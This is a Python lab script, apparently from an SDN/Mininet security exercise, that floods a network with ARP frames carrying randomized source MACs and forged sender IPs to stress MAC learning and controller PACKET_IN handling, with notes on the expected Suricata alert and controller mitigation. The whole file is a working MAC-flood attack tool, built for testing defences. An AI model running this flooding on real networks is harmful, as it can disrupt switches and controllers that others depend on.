#!/usr/bin/env python3
"""Generate MAC-churn ARP traffic (Mininet lab only).

Sends ARP request frames with randomized source MAC addresses.

It has two functions:
    - L2: many source MACs stress learning/MAC-table behavior.
    - SDN: lots of first-seen traffic can hit the table-miss rule and generate
      `PACKET_IN` messages to the controller.

Two demo modes:
    1) Control-plane pressure (default broadcast destination MAC):
       mininet> hacker .venv/bin/python3 src/scripts/mac_flood.py -i hacker-eth0 -d 20 -p 80

    2) Flow-table pressure (unicast destination MAC of a real host):
       mininet> intra ip link show intra-eth0
       mininet> hacker .venv/bin/python3 src/scripts/mac_flood.py -i hacker-eth0 -m <INTRA_MAC> -T 10.0.3.10 -d 20 -p 80

What you should observe:
    Suricata may alert on sid 1000007; the controller mitigates by installing a
    high-priority ARP drop on the attacker zone (Internet VLAN). After that,
    ARP-driven `PACKET_IN` pressure and learning-flow growth should stop.
"""

from __future__ import annotations

import argparse
import random
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

# Default flood profile for demo traffic generation.
DEFAULT_MAC_FLOOD_DURATION = 30
DEFAULT_MAC_FLOOD_PPS = 500
DEFAULT_TARGET_MAC = "ff:ff:ff:ff:ff:ff"
DEFAULT_TARGET_IP = IPv4Address("10.0.3.10")


def _random_mac_address() -> str:
    octets = [0x02]
    octets.extend(random.randint(0x00, 0xFF) for _ in range(5))  # noqa: S311
    return ":".join(f"{octet:02x}" for octet in octets)


def _random_source_ip() -> str:
    return f"172.16.{random.randint(0, 255)}.{random.randint(1, 254)}"  # noqa: S311


def mac_flood(
    interface: str,
    *,
    target_mac: str = DEFAULT_TARGET_MAC,
    target_ip: IPv4Address = DEFAULT_TARGET_IP,
    duration: int = DEFAULT_MAC_FLOOD_DURATION,
    pps: int = DEFAULT_MAC_FLOOD_PPS,
) -> None:
    """Send many Ethernet frames with randomized source MAC addresses.

    Args:
        interface: Egress interface to emit L2 frames from.
        target_mac: Destination MAC address for flood frames.
        target_ip: Destination IP used in forged ARP probes.
        duration: How long to sustain flooding in seconds.
        pps: Frames per second.
    """
    if duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    sent_frames = 0

    print(
        f"[{FILE_NAME}] {interface=} {target_mac=} "
        f"{target_ip=} {duration=}s {pps=}"
    )

    while time.monotonic() < end_time:
        frame = scapy.Ether(
            src=_random_mac_address(), dst=target_mac
        ) / scapy.ARP(
            op=1,
            hwsrc=_random_mac_address(),
            psrc=_random_source_ip(),
            hwdst="00:00:00:00:00:00",
            pdst=str(target_ip),
        )
        scapy.sendp(frame, iface=interface, verbose=False)
        sent_frames += 1
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent_frames} Ethernet frames sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate MAC flooding traffic.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-i",
        "--interface",
        required=True,
        type=str,
        help="Egress interface (for example hacker-eth0)",
    )
    parser.add_argument(
        "-m",
        "--target-mac",
        type=str,
        default=DEFAULT_TARGET_MAC,
        help="Destination MAC address",
    )
    parser.add_argument(
        "-T",
        "--target-ip",
        type=IPv4Address,
        default=DEFAULT_TARGET_IP,
        help="Destination IP used in ARP probes",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_MAC_FLOOD_DURATION,
        help="Flood duration in seconds",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_MAC_FLOOD_PPS,
        help="Frames per second",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    mac_flood(
        args.interface,
        target_mac=args.target_mac,
        target_ip=args.target_ip,
        duration=args.duration,
        pps=args.pps,
    )


if __name__ == "__main__":
    main()
